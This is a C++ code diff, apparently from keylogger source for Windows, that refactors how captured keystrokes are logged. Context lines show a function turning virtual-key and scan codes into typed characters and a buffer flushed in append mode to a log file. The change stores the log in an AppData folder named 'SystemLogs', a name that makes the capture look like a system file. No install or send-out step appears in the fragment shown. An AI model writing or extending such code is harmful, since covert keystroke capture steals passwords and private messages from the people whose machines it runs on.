@@ -37,16 +37,21 @@ char getTypedChar(DWORD vkCode, DWORD scanCode) {
     return '\0';
 }
 
-std::string getLogFilePathStr()
+const char *getLogFilePath()
 {
-    char appdataPath[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
+    static std::string fullPath;
+    if (fullPath.empty())
+    {
+        char appdataPath[MAX_PATH];
+        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
 
-    std::string fullPath = std::string(appdataPath) + LOG_FILE_PATH;
+        std::string dirPath = std::string(appdataPath) + "\\SystemLogs";
+        CreateDirectoryA(dirPath.c_str(), NULL);
 
-    CreateDirectoryA((std::string(appdataPath) + "\\SystemLogs").c_str(), NULL);
+        fullPath = dirPath + LOG_FILENAME;
+    }
 
-    return fullPath;
+    return fullPath.c_str();
 }
 
 void flushBuffer()
@@ -55,7 +60,7 @@ void flushBuffer()
         return;
 
     // append mode
-    FILE *file = fopen(getLogFilePathStr().c_str(), "a+");
+    FILE *file = fopen(getLogFilePath(), "a+");
     if (file)
     {
 
